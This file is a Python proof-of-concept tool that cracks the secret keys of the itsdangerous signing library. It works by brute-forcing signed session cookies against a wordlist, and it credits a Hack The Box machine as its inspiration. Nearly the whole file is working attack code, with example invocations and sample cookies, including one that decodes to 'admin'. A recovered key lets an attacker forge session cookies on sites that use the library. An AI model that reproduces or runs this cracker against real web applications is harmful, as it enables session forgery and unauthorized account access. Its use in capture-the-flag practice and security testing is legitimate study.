import base64
import argparse
import sys
from itsdangerous import URLSafeSerializer

# PoC for attacking itsdangerous signature verification by catakan. Inspired by 'Headless' HTB box.
# Only assumes DATA.SIGNATURE format without additional salting or timestamping.
# This is not (and will not be) optimized or developed by any means.

def parse_user_cookie(given_cookie):
	first_part = given_cookie.split('.')[0]
	signature_part = given_cookie.split('.')[-1]
	# If timestamp here second_part = given_cookie.split('.')[1]
	padding = '=' * (4 - len(first_part) % 4)
	first_part += padding
	
	try:
		decoded_bytes = base64.urlsafe_b64decode(first_part)
		# Decode bytes to string (assuming the decoded result is a UTF-8 string)
		decoded_string = decoded_bytes.decode('utf-8')
		decoded_string_without_quotes = decoded_string.replace('"', '')
		print("Data Section: " + first_part)
		print("Sanitized Data Section: " + decoded_string_without_quotes)
		print("Signature Section: " + signature_part)
		return decoded_string_without_quotes, signature_part
	except Exception as e:
		return f"Error decoding: {e}"

def crack_cookie_signature(cookie_value, possible_secret_key):
	serializer = URLSafeSerializer(possible_secret_key)
	possible_match = serializer.dumps(cookie_value)
	return possible_match

def main():
	example_usage = '''Example Usage:
		python3 itsdangerouscracker.py -c 'InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs' -w wordlists/chars_27_50000.txt
		python3 itsdangerouscracker.py -c 'ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0' -w wordlists/chars_27_50000.txt'''

	parser = argparse.ArgumentParser(description="A proof of concept script for cracking and obtainig itsdangerous library secret keys by brute forcing user cookies submited by server. This script assumes no timestamp is used and the cookie in DATA.SIGNATURE format.",
								  epilog=example_usage,
								  formatter_class=argparse.RawDescriptionHelpFormatter)
	parser.add_argument("-c", "--cookie", required=True, help="The cookie given by the server to user. In quotes.")
	parser.add_argument("-w", "--wordlist", required=True, help="Wordlist that contains possible secret keys that will be used for cracking.")
	
	args = parser.parse_args()
	user_cookie = args.cookie
	user_wordlist = args.wordlist
	
	# maybe further use
	cookie_data, cookie_signature = parse_user_cookie(user_cookie)
	with open(user_wordlist, 'r') as secret_file:
		for possible_key in secret_file:
			possible_key = possible_key.strip()
			possible_key = possible_key.encode('utf-8')
			generated_cookie = crack_cookie_signature(cookie_data, possible_key)

			# Display the key currently being tested on the same line
			sys.stdout.write(f"\rTesting key: {possible_key.decode('utf-8')}   ")
			sys.stdout.flush()

			if generated_cookie == user_cookie:
				valid_key = possible_key.decode('utf-8')
				print("\n==================================")
				print(f"The key is cracked: {valid_key}")
				break

if __name__ == "__main__":
	main()